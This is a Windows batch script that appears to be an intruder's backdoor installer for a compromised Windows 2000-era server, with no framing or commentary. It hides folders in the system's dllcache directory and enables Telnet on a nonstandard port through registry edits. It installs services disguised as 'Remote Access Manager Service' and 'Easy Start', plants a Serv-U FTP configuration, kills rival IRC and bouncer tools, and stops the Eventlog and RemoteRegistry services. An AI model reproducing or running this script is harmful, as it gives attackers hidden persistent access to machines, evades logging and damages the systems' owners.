@echo off
mkdir c:\winnt
mkdir c:\winnt\system32
mkdir c:\winnt\system32\dllcache
mkdir c:\winnt\system32\dllcache\I386
mkdir c:\winnt\system32\dllcache\I386\Assistance
mkdir c:\winnt\system32\dllcache\I386\dll
mkdir c:\winnt\system32\dllcache\I386\help
mkdir c:\winnt\system32\dllcache\I386\system
mkdir c:\winnt\system32\dllcache\I386\system32
mkdir c:\winnt\system32\dllcache\I386\support
mkdir c:\winnt\system32\dllcache\i386\test
attrib +a +h +s c:\winnt\system32\dllcache\I386\system32
attrib +a +h +s c:\winnt\system32\dllcache\I386
attrib +a +h +s c:\winnt\system32\dllcache\I386\Assistance
attrib +a +h +s c:\winnt\system32\dllcache\I386\support
attrib +a +h +s c:\winnt\system32\dllcache\I386\dll
attrib +a +h +s c:\winnt\system32\dllcache\I386\help
attrib +a +h +s c:\winnt\system32\dllcache\I386\system
attrib +a +h +s c:\winnt\system32\dllcache\i386\test
cd %systemroot%\system32
copy /y %systemroot%\system32\sert.bat c:\winnt\system32\dllcache\I386\system\sert.bat
del %systemroot%\system32\ServUDaemon.ini
del %systemroot%\system32\FiREDAEMON.EXE
ren %systemroot%\system32\FIREDAEM.EXE %systemroot%\system32\FiREDAEMON.EXE
move %systemroot%\system32\SERVUDAE.INI %systemroot%\system32\ServUDaemon.ini
cd c:\winnt\system32\dllcache
copy /y %systemroot%\system32\pack.exe c:\winnt\system32\dllcache\pack.exe
c:\winnt\system32\dllcache\pack.exe -o
ren c:\winnt\system32\dllcache\FIREDAEM.EXE c:\winnt\system32\dllcache\FiREDAEMON.EXE
ren c:\winnt\system32\dllcache\SERVUDAE.INI c:\winnt\system32\dllcache\ServUDaemon.ini
c:\winnt\system32\dllcache\rrc.exe GetValue HKEY_LOCAL_MACHINE\Software\Microsoft\TelnetServer\1.0\ /value=NTLM
c:\winnt\system32\dllcache\rrc.exe SetValue HKEY_LOCAL_MACHINE\Software\Microsoft\TelnetServer\1.0\ /value=NTLM /size=4 /data=01 /type=REG_DWORD
c:\winnt\system32\dllcache\rrc.exe SetValue HKEY_LOCAL_MACHINE\Software\Microsoft\TelnetServer\1.0\ /value=TelnetPort /size=4 /text=5A /type=REG_DWORD
c:\winnt\system32\dllcache\rrc.exe SetValue HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\TlntSvr /value=Start /size=4 /data=02 /type=REG_DWORD
%systemroot%\system32\rrc.exe GetValue HKEY_LOCAL_MACHINE\Software\Microsoft\TelnetServer\1.0\ /value=NTLM
%systemroot%\system32\rrc.exe SetValue HKEY_LOCAL_MACHINE\Software\Microsoft\TelnetServer\1.0\ /value=NTLM /size=4 /data=01 /type=REG_DWORD
%systemroot%\system32\rrc.exe SetValue HKEY_LOCAL_MACHINE\Software\Microsoft\TelnetServer\1.0\ /value=TelnetPort /size=4 /text=5A /type=REG_DWORD
%systemroot%\system32\rrc.exe SetValue HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\TlntSvr /value=Start /size=4 /data=02 /type=REG_DWORD
net stop tlntsvr
net start tlntsvr
copy c:\winnt\system32\dllcache\runbatch.exe %systemroot%\system32\smts.exe
copy /y c:\winnt\system32\dllcache\runbatch.exe %systemroot%\system32\dllcache\smts.exe
copy c:\winnt\system32\dllcache\srvss.exe %systemroot%\system32\CNMON32.EXE
copy /y c:\winnt\system32\dllcache\srvss.exe %systemroot%\system32\CNMON32.EXE
copy /y %systemroot%\system32\srvss.exe %systemroot%\system32\CNMON32.EXE
del c:\winnt\NDDEAPI.exe
copy c:\winnt\system32\dllcache\runbatch.exe c:\winnt\NDDEAPI.exe
copy /y c:\winnt\system32\dllcache\runbatch.exe c:\winnt\NDDEAPI.exe
copy /y %systemroot%\system32\runbatch.exe c:\winnt\NDDEAPI.exe
del c:\winnt\*servu*
copy c:\winnt\system32\dllcache\ServUDaemon.ini c:\winnt\ServUDaemon.ini
copy /y %systemroot%\system32\ServUDaemon.ini c:\winnt\ServUDaemon.ini
copy /y c:\winnt\system32\dllcache\ServUDaemon.ini c:\winnt\ServUDaemon.ini
cd c:\winnt\system32\dllcache
kill Serv*u*
kill firedaemon.exe
kill iroffer*
kill ir.exe
kill rundll*
kill winmg*
kill bnc*
net stop Eventlog /y
net stop LmHosts /y
net stop RemoteRegistry /y
net stop Schedule /y
net stop SENS /y
set MXBIN=C:\winnt\system32\dllcache
set MXHOME=C:\winnt\system32\dllcache
c:\winnt\system32\dllcache\yeh.exe createsvrany "RAMSE" "Remote Access Manager Service" "C:\WINNT\system32\dllcache\srvss.exe" "C:\WINNT\system32\dllcache\runbatch.exe"
net start RAMSE
%systemroot%\system32\yeh.exe createsvrany "RAMSEB" "Remote Access Manager Service Bkup" "%systemroot%\system32\srvss.exe" "c:\winnt\NDDEAPI.exe"
net start RAMSE
c:\winnt\system32\dllcache\firedaemon -i RAMSE "C:\WINNT\system32\dllcache" "C:\WINNT\system32\dllcache\runbatch.exe" "/u" Y 0 0 N Y
%systemroot%\system32\yeh.exe createsvrany "RAMSE" "Remote Access Manager Service" "%systemroot%\system32\srvss.exe" "%systemroot%\system32\runbatch.exe"
net start RAMSE
c:\winnt\system32\dllcache\yeh.exe start RAMSE
%systemroot%\system32\yeh.exe createsvrany "RAMSE" "Remote Access Manager Service" "%systemroot%\system32\dllcache\srvss.exe" "%systemroot%\system32\dllcache\runbatch.exe"
%systemroot%\system32\firedaemon -i RAMSEB "%systemroot%\system32\dllcache" "%systemroot%\system32\dllcache\runbatch.exe" "/u" Y 0 0 N Y
net start RAMSEB
%systemroot%\system32\yeh.exe start RAMSEB
%systemroot%\system32\yeh.exe createsvrany "eSTART" "Easy Start 3.21" "%systemroot%\system32\CNMON32.EXE" "%systemroot%\system32\smts.exe"
net start eSTART
%systemroot%\system32\yeh.exe start eSTART
mkdir C:\winnt\system32\spool
mkdir C:\winnt\system32\spool\drivers
mkdir C:\winnt\system32\spool\drivers\w42x86
mkdir C:\winnt\system32\spool\drivers\w32x86
attrib +a +h +s C:\winnt\system32\spool\drivers\w42x86
attrib +a +h +s C:\winnt\system32\spool\drivers\w32x86
attrib +a +h +s C:\winnt\system32\spool\drivers
attrib +a +h +s C:\winnt\system32\spool
attrib +a -h -s -r C:\winnt\system32\dllcache\I386\dll\tar.exe
attrib +a +h +s c:\winnt\ServUDaemon.ini
attrib +a +h +s c:\winnt\NDDEAPI.EXE
copy /y %systemroot%\system32\userlist.exe c:\winnt\system32\dllcache\I386\system\win.exe
copy /y %systemroot%\system32\cygwin1.dll c:\winnt\system32\dllcache\I386\system\cygwin1.dll
copy /y %systemroot%\system32\cfg.dll c:\winnt\system32\dllcache\I386\system\cfg.dll
copy /y %systemroot%\system32\ServUDaemon.ini c:\winnt\system32\dllcache\I386\system32\ServUDaemon.ini
%systemroot%\system32\kill.exe Serv*u*
copy /y %systemroot%\system32\runbatch.exe c:\winnt\system32\dllcache\I386\system32\NETDDEE.EXE
